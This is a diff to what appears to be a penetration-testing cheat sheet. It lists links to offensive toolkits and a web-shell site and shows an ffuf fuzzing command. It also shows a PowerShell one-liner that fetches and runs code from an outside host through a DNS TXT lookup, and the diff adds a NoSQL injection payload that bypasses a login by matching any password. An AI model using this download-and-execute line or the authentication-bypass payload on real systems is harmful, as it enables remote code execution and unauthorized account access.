@@ -7,8 +7,9 @@ https://github.com/samratashok/nishang
 https://github.com/411Hall/JAWS
 https://github.com/unicorn-engine/unicorn
 https://github.com/ropnop/kerbrute
-https://www.r57shell.net
 https://github.com/swisskyrepo/PayloadsAllTheThings
+https://www.r57shell.net
+
 ```
 
 ```sh
@@ -26,4 +27,9 @@ ffuf -request 'file.req' -request-proto hhtp or https -w 'List extensions fuzzin
 
 ```sh
 powershell . (nslookup -q=txt mrmtwoj.ir)[-1]
+```
+
+### BYPass Sql inkect and json 
+```sh
+{"username":"admin","password":{"$ne":""}}
 ```
